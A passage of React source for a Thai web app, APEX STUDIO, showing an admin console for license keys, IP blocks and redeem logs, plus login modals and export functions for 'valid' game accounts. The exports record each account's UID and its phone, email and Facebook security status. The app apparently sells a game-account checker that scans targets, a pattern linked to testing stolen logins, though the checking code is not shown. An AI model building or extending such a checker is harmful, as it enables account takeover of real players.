      `Security: Phone Bound:${a.phoneBound ? 'Yes' : 'No'} | Email:${a.emailVerified ? 'Verified' : 'Not Verified'} | FB:${a.fbLinked ? 'Yes' : 'No'}\n` +
      `Other Games: ${a.otherGames.join(', ') || 'None'}\n` +
      `Checked At: ${a.cleanAt}\n` +
      `------------------------------------------`
    ).join('\n');
    downloadFile(`All_Valid_Detailed_${new Date().toISOString().slice(0, 10)}.txt`, text);
    Swal.fire({ title: 'สำเร็จ', text: 'บันทึกไฟล์รายละเอียดสำเร็จ', icon: 'success' });
  };

  const downloadValidDetail = () => {
    if (!validAccounts.length) return Swal.fire({ title: 'ข้อมูล', text: 'ไม่มีข้อมูลบัญชีที่ผ่าน', icon: 'info' });
    const content = JSON.stringify(validAccounts, null, 2);
    downloadFile(`Apex_Database_Export_${new Date().toISOString().slice(0, 10)}.json`, content);
    Swal.fire({
      title: 'สำเร็จ',
      text: 'ส่งออกฐานข้อมูลสำเร็จ',
      icon: 'success',
      background: '#09090b',
      color: '#fff'
    });
  };

  // --- Admin Dashboard Component ---
  const AdminDashboard = () => {
    const successRate = totalChecked > 0 ? ((validAccounts.length / totalChecked) * 100).toFixed(1) : '0';

    const DatabaseSetupGuide = () => (
      <div className="bg-zinc-900/50 border border-amber-500/20 rounded-3xl p-8 max-w-2xl mx-auto mt-12 animate-in fade-in slide-in-from-bottom-4 duration-500 backdrop-blur-xl shadow-2xl">
        <div className="flex items-center gap-4 mb-8">
          <div className="p-4 bg-amber-500/20 rounded-2xl">
            <Database className="w-8 h-8 text-amber-500" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white tracking-tight">Database Setup Required</h2>
            <p className="text-zinc-500 text-sm mt-1">Supabase tables are missing from the current schema.</p>
          </div>
        </div>
        
        <div className="space-y-8">
          <div className="flex gap-5">
            <div className="flex-shrink-0 w-10 h-10 rounded-2xl bg-zinc-800 flex items-center justify-center text-zinc-400 text-sm font-black border border-white/5">01</div>
            <div className="pt-1">
              <h3 className="text-white font-bold mb-1 tracking-tight">Open Supabase SQL Editor</h3>
              <p className="text-zinc-500 text-sm leading-relaxed">Go to your project at <a href="https://supabase.com/dashboard" target="_blank" rel="noreferrer" className="text-amber-500 hover:underline font-bold">Supabase Dashboard</a> and open the SQL Editor.</p>
            </div>
          </div>

          <div className="flex gap-5">
            <div className="flex-shrink-0 w-10 h-10 rounded-2xl bg-zinc-800 flex items-center justify-center text-zinc-400 text-sm font-black border border-white/5">02</div>
            <div className="pt-1 flex-grow">
              <h3 className="text-white font-bold mb-1 tracking-tight">Execute Bootstrap SQL</h3>
              <p className="text-zinc-500 text-sm mb-4 leading-relaxed">Copy the code below, paste it into a new query, and click <strong>"Run"</strong>.</p>
              <div className="relative group">
                <pre className="bg-black/80 rounded-2xl p-5 text-[11px] font-mono text-zinc-400 overflow-x-auto border border-white/5 max-h-64 scrollbar-thin scrollbar-thumb-zinc-800 leading-relaxed">
{`-- 1. Table for license keys
CREATE TABLE license_keys (
    id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
    key text UNIQUE NOT NULL,
    plan text NOT NULL,
    status text NOT NULL DEFAULT 'active',
    created_at timestamptz DEFAULT now()
);

-- 2. Table for used keys
CREATE TABLE used_keys (
    id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
    key text NOT NULL,
    ip text NOT NULL,
    details text,
    used_at timestamptz DEFAULT now()
);

-- 3. Table for blocked IPs
CREATE TABLE blocked_ips (
    ip text PRIMARY KEY,
    reason text,
    blocked_at timestamptz DEFAULT now()
);

-- 4. Table for admins
CREATE TABLE admins (
    id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
    username text UNIQUE NOT NULL,
    role text NOT NULL DEFAULT 'admin',
    granted_at timestamptz DEFAULT now()
);`}
                </pre>
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(`CREATE TABLE license_keys (id uuid DEFAULT gen_random_uuid() PRIMARY KEY, key text UNIQUE NOT NULL, plan text NOT NULL, status text NOT NULL DEFAULT 'active', created_at timestamptz DEFAULT now()); CREATE TABLE used_keys (id uuid DEFAULT gen_random_uuid() PRIMARY KEY, key text NOT NULL, ip text NOT NULL, details text, used_at timestamptz DEFAULT now()); CREATE TABLE blocked_ips (ip text PRIMARY KEY, reason text, blocked_at timestamptz DEFAULT now()); CREATE TABLE admins (id uuid DEFAULT gen_random_uuid() PRIMARY KEY, username text UNIQUE NOT NULL, role text NOT NULL DEFAULT 'admin', granted_at timestamptz DEFAULT now());`);
                    Swal.fire({ title: 'Copied!', text: 'SQL Code สำหรับรันใน Supabase ก๊อปปี้แล้ว', icon: 'success', timer: 2000, showConfirmButton: false, background: '#09090b', color: '#fff' });
                  }}
                  className="absolute top-3 right-3 p-2.5 bg-zinc-800 hover:bg-zinc-700 rounded-xl transition-all border border-white/5 text-amber-500 shadow-xl"
                  title="Copy SQL"
                >
                  <Copy className="w-5 h-5" />
                </button>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-10 pt-8 border-t border-white/5 flex items-center justify-between gap-4">
           <div className="flex items-center gap-3 text-zinc-500 text-xs italic">
             <div className="w-2 h-2 rounded-full bg-amber-500 animate-ping"></div>
             Waiting for tables to be created...
           </div>
           <button 
             onClick={() => window.location.reload()}
             className="text-white text-xs font-bold uppercase tracking-widest bg-zinc-800 hover:bg-zinc-700 px-6 py-3 rounded-xl transition-all border border-white/5"
           >
             Refresh Now
           </button>
        </div>
      </div>
    );
    
    return (
      <div className="min-h-screen bg-[#050507] text-white p-4 md:p-8 animate-in fade-in duration-700 font-sans">
        <div className="max-w-7xl mx-auto">
          {/* Header */}
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-8">
            <div className="flex items-center gap-4">
              <div className="p-3 bg-red-500/10 rounded-2xl border border-red-500/20">
                <Crown className="w-8 h-8 text-red-500" />
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-red-500 to-amber-500 bg-clip-text text-transparent uppercase tracking-tighter">
                  Apex Backend Management
                </h1>
                <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest mt-0.5">Control Center • {adminUsername}</p>
              </div>
            </div>
            <div className="flex items-center gap-3 w-full md:w-auto">
              <div className="bg-zinc-900/50 border border-white/5 rounded-2xl px-4 py-2 flex items-center gap-2 flex-1 md:flex-none">
                <div className={`w-2 h-2 rounded-full ${isDBReady ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`}></div>
                <span className="text-[10px] font-bold text-zinc-400 uppercase">System: {isDBReady ? 'Stable' : 'DB ERROR'}</span>
              </div>
              <button 
                onClick={() => setIsAdmin(false)}
                className="bg-zinc-900 hover:bg-zinc-800 text-zinc-400 border border-white/5 px-6 py-2 rounded-2xl text-[10px] font-bold transition-all flex items-center gap-2 uppercase tracking-widest"
              >
                <LogOut className="w-4 h-4" /> Exit Console
              </button>
            </div>
          </div>

          {!isDBReady ? (
            <DatabaseSetupGuide />
          ) : (
            <>
              {/* Navigation Tabs */}
              <div className="flex items-center gap-2 mb-8 overflow-x-auto pb-2 scrollbar-none">
                {[
                  { id: 'overview', label: 'Dashboard', icon: BarChart3 },
                  { id: 'keys', label: 'License Keys', icon: Key },
                  { id: 'history', label: 'Redeem History', icon: History },
                  { id: 'ips', label: 'Access Control', icon: ShieldAlert }
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setAdminTab(tab.id as any)}
                    className={`flex items-center gap-2 px-6 py-3 rounded-2xl text-xs font-bold transition-all border whitespace-nowrap ${
                      adminTab === tab.id 
                      ? 'bg-red-500/10 border-red-500/30 text-red-500 shadow-[0_0_20px_rgba(239,68,68,0.1)]' 
                      : 'bg-zinc-900/50 border-white/5 text-zinc-500 hover:bg-zinc-900 hover:text-zinc-300'
                    }`}
                  >
                    <tab.icon className="w-4 h-4" /> {tab.label}
                  </button>
                ))}
              </div>

              <AnimatePresence mode="wait">
            {adminTab === 'overview' && (
              <motion.div 
                key="overview"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-8"
              >
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  {[
                    { label: 'Scanned (Session)', value: totalChecked, icon: Activity, color: 'text-blue-500', bg: 'bg-blue-500/10' },
                    { label: 'Active Keys', value: firebaseKeys.filter(k => k.status === 'active').length, icon: Database, color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                    { label: 'Redeemed Today', value: usedKeysHistory.filter(h => new Date(h.used_at).toDateString() === new Date().toDateString()).length, icon: History, color: 'text-amber-500', bg: 'bg-amber-500/10' },
                    { label: 'Blocked Users', value: blockedIPs.length, icon: Ban, color: 'text-red-500', bg: 'bg-red-500/10' }
                  ].map((stat, i) => (
                    <div key={i} className="bg-[#09090b] border border-white/5 p-6 rounded-3xl relative overflow-hidden group">
                      <div className={`absolute top-0 right-0 w-24 h-24 ${stat.bg} blur-3xl opacity-20 -mr-8 -mt-8 transition-all group-hover:scale-150`}></div>
                      <div className="flex items-center justify-between relative z-10">
                        <div>
                          <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest mb-1">{stat.label}</p>
                          <h3 className="text-3xl font-mono font-bold tracking-tighter">{stat.value}</h3>
                        </div>
                        <div className={`p-4 rounded-2xl ${stat.bg} ${stat.color}`}>
                          <stat.icon className="w-6 h-6" />
                        </div>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                  <div className="lg:col-span-2 space-y-6">
                    <div className="bg-[#09090b] border border-white/5 rounded-3xl overflow-hidden font-sans">
                      <div className="p-6 border-b border-white/5 flex justify-between items-center bg-zinc-900/20">
                        <h3 className="font-bold flex items-center gap-2">
                          <Activity className="w-4 h-4 text-emerald-500" /> Session Activity Log
                        </h3>
                        <Activity className="w-4 h-4 text-zinc-500 animate-pulse" />
                      </div>
                      <div className="max-h-[500px] overflow-y-auto scrollbar-thin scrollbar-thumb-zinc-800">
                        <table className="w-full text-left text-sm">
                          <thead>
                            <tr className="text-zinc-500 border-b border-white/5 bg-zinc-900/10">
                              <th className="p-4 font-bold uppercase text-[10px]">Target</th>
                              <th className="p-4 font-bold uppercase text-[10px]">Result</th>
                              <th className="p-4 font-bold uppercase text-[10px]">UID</th>
                              <th className="p-4 font-bold uppercase text-[10px]">Time</th>
                            </tr>
                          </thead>
                          <tbody className="font-mono text-[11px]">
                            {validAccounts.length > 0 ? validAccounts.map((acc, i) => (
                              <tr key={i} className="border-b border-white/5 hover:bg-white/[0.02] transition-colors">
                                <td className="p-4 text-zinc-300">{acc.account}</td>
                                <td className="p-4">
                                  <span className="text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded uppercase text-[9px]">Verified</span>
                                </td>
                                <td className="p-4 text-zinc-500">{acc.uid}</td>
                                <td className="p-4 text-zinc-600">{new Date().toLocaleTimeString()}</td>
                              </tr>
                            )) : (
                              <tr>
                                <td colSpan={4} className="p-12 text-center text-zinc-700 italic">No activity recorded in this session</td>
                              </tr>
                            )}
                          </tbody>
                        </table>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-6">
                    <div className="bg-[#09090b] border border-white/5 rounded-3xl p-6">
                      <h3 className="font-bold flex items-center gap-2 mb-6">
                        <Settings className="w-4 h-4 text-zinc-500" /> Utility Tools
                      </h3>
                      <div className="space-y-4">
                        <button onClick={addLicenseKey} className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/20 p-4 rounded-2xl flex items-center justify-between group transition-all">
                          <div className="flex items-center gap-3">
                            <Plus className="w-5 h-5 text-emerald-500" />
                            <div className="text-left">
                              <p className="text-sm font-bold text-emerald-500">Create New Keys</p>
                              <p className="text-[10px] text-zinc-500">Bulk generation system</p>
                            </div>
                          </div>
                          <ChevronRight className="w-4 h-4 text-zinc-700" />
                        </button>
                        <button onClick={blockIP} className="w-full bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 p-4 rounded-2xl flex items-center justify-between group transition-all">
                          <div className="flex items-center gap-3">
                            <Ban className="w-5 h-5 text-red-500" />
                            <div className="text-left">
                              <p className="text-sm font-bold text-red-500">Block Address</p>
                              <p className="text-[10px] text-zinc-500">Instantly restrict IP</p>
                            </div>
                          </div>
                          <ChevronRight className="w-4 h-4 text-zinc-700" />
                        </button>
                      </div>
                    </div>
                    
                    <div className="bg-zinc-900/20 border border-white/5 rounded-3xl p-6 text-center">
                       <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest mb-4">Storage Usage</p>
                       <div className="w-full bg-zinc-900 rounded-full h-1.5 mb-2 overflow-hidden">
                          <div className="bg-red-500 h-full w-[15%] rounded-full shadow-[0_0_10px_rgba(239,68,68,0.5)]"></div>
                       </div>
                       <p className="text-zinc-600 text-[9px]">1.2MB / 512MB (Enterprise Plan)</p>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {adminTab === 'keys' && (
              <motion.div 
                key="keys"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="bg-[#09090b] border border-white/5 rounded-3xl overflow-hidden"
              >
                <div className="p-8 border-b border-white/5 flex justify-between items-center bg-zinc-900/20">
                  <div>
                    <h3 className="text-xl font-bold">Key Management</h3>
                    <p className="text-zinc-500 text-xs mt-1">Manage and track all generated licenses</p>
                  </div>
                  <button onClick={addLicenseKey} className="bg-emerald-600 hover:bg-emerald-500 text-white px-6 py-2.5 rounded-2xl text-xs font-bold transition-all flex items-center gap-2 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
                    <Plus className="w-4 h-4" /> GENERATE NEW KEYS
                  </button>
                </div>
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-sm">
                    <thead>
                      <tr className="text-zinc-500 border-b border-white/5 bg-zinc-900/10 uppercase text-[10px] font-bold">
                        <th className="p-4">License Key</th>
                        <th className="p-4">Type</th>
                        <th className="p-4">Status</th>
                        <th className="p-4">Created At</th>
                        <th className="p-4 text-right">Action</th>
                      </tr>
                    </thead>
                    <tbody className="font-mono text-xs">
                      {firebaseKeys.length > 0 ? firebaseKeys.map((key, i) => (
                        <tr key={i} className="border-b border-white/5 hover:bg-white/[0.02] transition-colors">
                          <td className="p-4">
                            <div className="flex items-center gap-3">
                               <div className="w-2 h-2 rounded-full bg-cyan-500 shadow-[0_0_8px_rgba(6,182,212,0.5)]"></div>
                               <span className="text-zinc-200 select-all">{key.key}</span>
                            </div>
                          </td>
                          <td className="p-4">
                            <span className="bg-zinc-800 text-zinc-400 px-2 py-0.5 rounded text-[10px]">{key.plan}</span>
                          </td>
                          <td className="p-4">
                            <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${key.status === 'active' ? 'text-emerald-500' : 'text-zinc-600'}`}>
                              {key.status.toUpperCase()}
                            </span>
                          </td>
                          <td className="p-4 text-zinc-600">{new Date(key.created_at).toLocaleDateString()}</td>
                          <td className="p-4 text-right">
                            <button onClick={() => deleteKey(key.id)} className="p-2 hover:bg-red-500/10 text-zinc-700 hover:text-red-500 rounded-lg transition-all">
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </td>
                        </tr>
                      )) : (
                        <tr><td colSpan={5} className="p-20 text-center text-zinc-600">No keys found in database</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </motion.div>
            )}

            {adminTab === 'history' && (
              <motion.div 
                key="history"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="bg-[#09090b] border border-white/5 rounded-3xl overflow-hidden"
              >
                 <div className="p-8 border-b border-white/5 bg-zinc-900/20">
                    <h3 className="text-xl font-bold">Redeem Logs</h3>
                    <p className="text-zinc-500 text-xs mt-1">Audit trail of all license usage</p>
                 </div>
                 <div className="overflow-x-auto">
                  <table className="w-full text-left text-sm">
                    <thead>
                      <tr className="text-zinc-500 border-b border-white/5 bg-zinc-900/10 uppercase text-[10px] font-bold">
                        <th className="p-4">Key Used</th>
                        <th className="p-4">User IP</th>
                        <th className="p-4">Timestamp</th>
                        <th className="p-4">Status</th>
                      </tr>
                    </thead>
                    <tbody className="font-mono text-xs">
                      {usedKeysHistory.length > 0 ? usedKeysHistory.map((h, i) => (
                        <tr key={i} className="border-b border-white/5 hover:bg-white/[0.02] transition-colors">
                          <td className="p-4 text-amber-500/80">{h.key}</td>
                          <td className="p-4 text-zinc-400">{h.ip}</td>
                          <td className="p-4 text-zinc-600">{new Date(h.used_at).toLocaleString()}</td>
                          <td className="p-4"><span className="text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded text-[10px]">SUCCESS</span></td>
                        </tr>
                      )) : (
                        <tr><td colSpan={4} className="p-20 text-center text-zinc-600">No history records found</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </motion.div>
            )}

            {adminTab === 'ips' && (
              <motion.div 
                key="ips"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="bg-[#09090b] border border-white/5 rounded-3xl overflow-hidden"
              >
                 <div className="p-8 border-b border-white/5 flex justify-between items-center bg-zinc-900/20">
                    <div>
                      <h3 className="text-xl font-bold">IP Access Control</h3>
                      <p className="text-zinc-500 text-xs mt-1">Permanently block malicious users</p>
                    </div>
                    <button onClick={blockIP} className="bg-red-600 hover:bg-red-500 text-white px-6 py-2.5 rounded-2xl text-xs font-bold transition-all flex items-center gap-2">
                       <Ban className="w-4 h-4" /> BLOCK NEW IP
                    </button>
                 </div>
                 <div className="overflow-x-auto">
                    <table className="w-full text-left text-sm">
                      <thead>
                        <tr className="text-zinc-500 border-b border-white/5 bg-zinc-900/10 uppercase text-[10px] font-bold">
                          <th className="p-4">IP Address</th>
                          <th className="p-4">Reason</th>
                          <th className="p-4">Date Blocked</th>
                          <th className="p-4 text-right">Actions</th>
                        </tr>
                      </thead>
                      <tbody className="font-mono text-xs">
                        {blockedIPs.length > 0 ? blockedIPs.map((ip, i) => (
                          <tr key={i} className="border-b border-white/5 hover:bg-white/[0.02] transition-colors">
                            <td className="p-4 text-red-500 font-bold tracking-tight">{ip.ip}</td>
                            <td className="p-4 text-zinc-400 italic">"{ip.reason}"</td>
                            <td className="p-4 text-zinc-600">{new Date(ip.blocked_at).toLocaleDateString()}</td>
                            <td className="p-4 text-right">
                               <button onClick={() => unblockIP(ip.ip)} className="text-emerald-500 hover:text-emerald-400 text-[10px] font-bold uppercase tracking-widest bg-emerald-500/5 hover:bg-emerald-500/10 px-3 py-1.5 rounded-lg border border-emerald-500/10 transition-all">
                                  Unblock
                               </button>
                            </td>
                          </tr>
                        )) : (
                          <tr><td colSpan={4} className="p-20 text-center text-zinc-600">No IP blocks active</td></tr>
                        )}
                      </tbody>
                    </table>
                 </div>
              </motion.div>
            )}
          </AnimatePresence>
        </>
      )}
    </div>
  </div>
);
};

  if (isIPBlocked) return (
    <div className="min-h-screen bg-[#050507] flex items-center justify-center p-4">
      <div className="w-full max-w-lg bg-red-500/5 border border-red-500/20 rounded-[3rem] p-12 text-center relative overflow-hidden">
        <ShieldAlert className="w-20 h-20 text-red-500 mx-auto mb-6 animate-pulse" />
        <h1 className="text-3xl font-bold text-red-500 mb-4 uppercase tracking-tighter">Access Revoked</h1>
        <p className="text-zinc-400 text-sm leading-relaxed mb-8">
           ที่อยู่ IP ของคุณ ({clientIp}) ถูกระงับการเข้าถึงระบบเนื่องจากละเมิดข้อตกลงการใช้งานหรือพบพฤติกรรมที่น่าสงสัย หากคุณคิดว่าเป็นความผิดพลาด กรุณาติดต่อผู้ดูแลระบบ APEX STUDIO
        </p>
        <div className="bg-zinc-900/50 rounded-2xl p-4 text-[10px] text-zinc-500 font-mono mb-8">
           Error Code: APEX_SECURITY_BLOCK_L4
        </div>
        <button onClick={() => window.location.reload()} className="bg-red-600 hover:bg-red-500 text-white px-8 py-3 rounded-2xl text-xs font-bold transition-all">
           TRY RECONNECTING
        </button>
      </div>
    </div>
  );

  if (isAdmin) return <AdminDashboard />;
  if (!isLoaded) return (
    <div className="min-h-screen bg-[#0d0d0f] flex flex-col items-center justify-center gap-4">
      <div className="w-12 h-12 border-4 border-cyan-500/20 border-t-cyan-500 rounded-full animate-spin"></div>
      <div className="text-cyan-500/50 text-xs font-mono animate-pulse">BOOTING APEX STUDIO...</div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#0d0d0f] text-white font-sans selection:bg-cyan-500/30">
      
      {/* Auth Modal */}
      {showAuthModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md">
          <div className="w-full max-w-sm bg-[#09090b] border border-white/10 rounded-[2.5rem] p-8 shadow-2xl animate-in fade-in zoom-in duration-300 overflow-hidden relative">
            <div className={`absolute top-0 right-0 w-32 h-32 blur-[50px] rounded-full -mr-16 -mt-16 ${authMode === 'login' ? 'bg-cyan-500/10' : 'bg-emerald-500/10'}`}></div>
            <div className="flex flex-col items-center text-center mb-8 relative z-10">
              <div className={`w-16 h-16 rounded-2xl flex items-center justify-center mb-4 border ${authMode === 'login' ? 'bg-cyan-500/10 border-cyan-500/20' : 'bg-emerald-500/10 border-emerald-500/20'}`}>
                {authMode === 'login' ? <Key className="w-8 h-8 text-cyan-500" /> : <User className="w-8 h-8 text-emerald-500" />}
              </div>
              <h2 className="text-xl font-bold tracking-tight">{authMode === 'login' ? 'เข้าสู่ระบบ' : 'สมัครสมาชิก'}</h2>
              <p className="text-zinc-500 text-xs mt-1">
                {authMode === 'login' ? 'ลงชื่อเข้าใช้เพื่อเข้าถึง APEX STUDIO' : 'เข้าร่วมกับเราเพื่อเริ่มต้นใช้งานเครื่องมือต่างๆ'}
              </p>
            </div>

            <form onSubmit={handleAuth} className="space-y-4 relative z-10">
              <div className="space-y-2">
                <div className="relative">
                  <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                  <input 
                    type="email" 
                    value={authEmail}
                    onChange={(e) => setAuthEmail(e.target.value)}
                    className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-cyan-500/50 transition-all font-sans text-sm"
                    placeholder="อีเมล"
                    required
                  />
                </div>
              </div>

              {authMode === 'signup' && (
                <div className="space-y-2">
                  <div className="relative">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                    <input 
                      type="text" 
                      value={authUsername}
                      onChange={(e) => setAuthUsername(e.target.value)}
                      className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-cyan-500/50 transition-all font-sans text-sm"
                      placeholder="ชื่อผู้ใช้"
                      required
                    />
                  </div>
                </div>
              )}

              <div className="space-y-2">
                <div className="relative">
                  <Shield className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                  <input 
                    type="password" 
                    value={authPassword}
                    onChange={(e) => setAuthPassword(e.target.value)}
                    className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-cyan-500/50 transition-all font-sans text-sm"
                    placeholder="รหัสผ่าน"
                    required
                    minLength={6}
                  />
                </div>
              </div>

              {authMode === 'signup' && (
                <div className="space-y-2">
                  <div className="relative">
                    <Shield className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                    <input 
                      type="password" 
                      value={authConfirmPassword}
                      onChange={(e) => setAuthConfirmPassword(e.target.value)}
                      className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-cyan-500/50 transition-all font-sans text-sm"
                      placeholder="ยืนยันรหัสผ่าน"
                      required
                      minLength={6}
                    />
                  </div>
                </div>
              )}
              
              <div className="flex justify-center my-4">
                <Turnstile
                  siteKey={TURNSTILE_SITE_KEY}
                  onSuccess={(token) => setTurnstileToken(token)}
                  onError={() => setTurnstileToken(null)}
                  onExpire={() => setTurnstileToken(null)}
                  options={{ theme: 'dark' }}
                />
              </div>

              <button 
                type="submit"
                disabled={authLoading || !turnstileToken}
                className={`w-full py-4 rounded-3xl text-sm font-bold transition-all shadow-xl flex items-center justify-center gap-2 ${
                  authMode === 'login' 
                    ? 'bg-cyan-600 hover:bg-cyan-500 shadow-cyan-500/10' 
                    : 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-500/10'
                } disabled:opacity-50 disabled:cursor-not-allowed`}
              >
                {authLoading ? (
                  <div className="w-5 h-5 border-2 border-white/20 border-t-white rounded-full animate-spin"></div>
                ) : (
                  authMode === 'login' ? 'เข้าสู่ระบบ' : 'สมัครสมาชิก'
                )}
              </button>

              <div className="text-center mt-6">
                <p className="text-xs text-zinc-600">
                  {authMode === 'login' ? "ยังไม่มีบัญชีใช่หรือไม่?" : "มีบัญชีอยู่แล้วใช่หรือไม่?"}
                  <button 
                    type="button"
                    onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')}
                    className="ml-2 text-cyan-500 hover:underline font-bold"
                  >
                    {authMode === 'login' ? 'สมัครสมาชิก' : 'เข้าสู่ระบบ'}
                  </button>
                </p>
              </div>

              <button 
                type="button"
                onClick={() => setShowAuthModal(false)}
                className="w-full text-zinc-700 hover:text-zinc-500 text-[10px] font-bold uppercase tracking-widest mt-4"
              >
                ปิดหน้าต่าง
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Admin Login Modal Overlay */}
      {showAdminLogin && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md">
          <div className="w-full max-w-sm bg-[#09090b] border border-white/10 rounded-[2.5rem] p-8 shadow-2xl animate-in fade-in zoom-in duration-300 overflow-hidden relative">
            <div className="absolute top-0 right-0 w-32 h-32 bg-red-500/10 blur-[50px] rounded-full -mr-16 -mt-16"></div>
            <div className="flex flex-col items-center text-center mb-8 relative z-10">
              <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center mb-4 border border-red-500/20">
                <Crown className="w-8 h-8 text-red-500" />
              </div>
              <h2 className="text-xl font-bold tracking-tight">Backend Entry</h2>
              <p className="text-zinc-500 text-xs mt-1">APEX STUDIO AUTHORIZATION REQUIRED</p>
            </div>

            <form onSubmit={handleAdminLogin} className="space-y-4 relative z-10">
              <div className="space-y-2">
                <div className="relative">
                  <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                  <input 
                    type="text" 
                    value={adminUsername}
                    onChange={(e) => setAdminUsername(e.target.value)}
                    className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-red-500/50 transition-all font-mono text-sm"
                    placeholder="Enter Username"
                    autoFocus
                  />
                </div>
              </div>
              <div className="space-y-2">
                <div className="relative">
                  <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                  <input 
                    type="password" 
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    className="w-full bg-zinc-900/50 border border-white/5 rounded-2xl py-3.5 pl-12 pr-4 outline-none focus:border-red-500/50 transition-all font-mono text-sm"
                    placeholder="Enter Password"
                  />
                </div>
              </div>
              <div className="pt-2 flex gap-3">
                <button 
                  type="button"
                  onClick={() => setShowAdminLogin(false)}
                  className="flex-1 bg-zinc-900 hover:bg-zinc-800 py-3.5 rounded-2xl text-xs font-bold transition-all border border-white/5"
                >
                  CANCEL
                </button>
                <button 
                  type="submit"
                  className="flex-1 bg-red-600 hover:bg-red-500 py-3.5 rounded-2xl text-xs font-bold transition-all shadow-[0_0_20px_rgba(239,68,68,0.2)]"
                >
                  ENTER
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Navbar - Shop Theme */}

      <nav className="sticky top-0 z-40 bg-[#0d0d0f]/80 backdrop-blur-lg border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-8">
            <img 
              src="https://img2.pic.in.th/-59_20260425171043.png" 
              alt="APEX STUDIO TH" 
              className="h-12 object-contain drop-shadow-[0_0_15px_rgba(34,211,238,0.3)] cursor-pointer active:scale-95 transition-transform select-none" 
              onClick={handleLogoClick}
            />
            <div className="hidden md:flex items-center gap-6 text-sm font-medium text-zinc-400">
              <a href="#" className="hover:text-cyan-400 transition-colors flex items-center gap-2"><Home className="w-4 h-4"/> หน้าแรก</a>
              <a href="#" className="hover:text-cyan-400 transition-colors flex items-center gap-2"><ShoppingCart className="w-4 h-4"/> สินค้าทั้งหมด</a>
              <a href="#" className="hover:text-cyan-400 transition-colors flex items-center gap-2"><CreditCard className="w-4 h-4"/> เติมเงิน</a>
              <a href="#" className="text-cyan-400 font-bold flex items-center gap-2 drop-shadow-[0_0_8px_rgba(34,211,238,0.4)]"><Shield className="w-4 h-4"/> เช็คไอดี (Checker)</a>
              <a href="#" className="hover:text-cyan-400 transition-colors flex items-center gap-2"><Phone className="w-4 h-4"/> ติดต่อเรา</a>
            </div>
          </div>
          <div className="flex items-center gap-4">
            {user ? (
              <div className="flex items-center gap-3">
                <div className="flex flex-col items-end hidden sm:flex">
                  <div className="flex items-center gap-1.5">
                    {user.email_confirmed_at ? (
                      <CheckCircle2 className="w-3 h-3 text-emerald-500" />
                    ) : (
                      <AlertTriangle className="w-3 h-3 text-amber-500" />
                    )}
                    <span className="text-sm font-bold text-white leading-tight truncate max-w-[120px]">{user.email}</span>
                  </div>
                  <span className={`text-[10px] font-bold uppercase tracking-wider ${user.email_confirmed_at ? 'text-emerald-500' : 'text-amber-500'}`}>
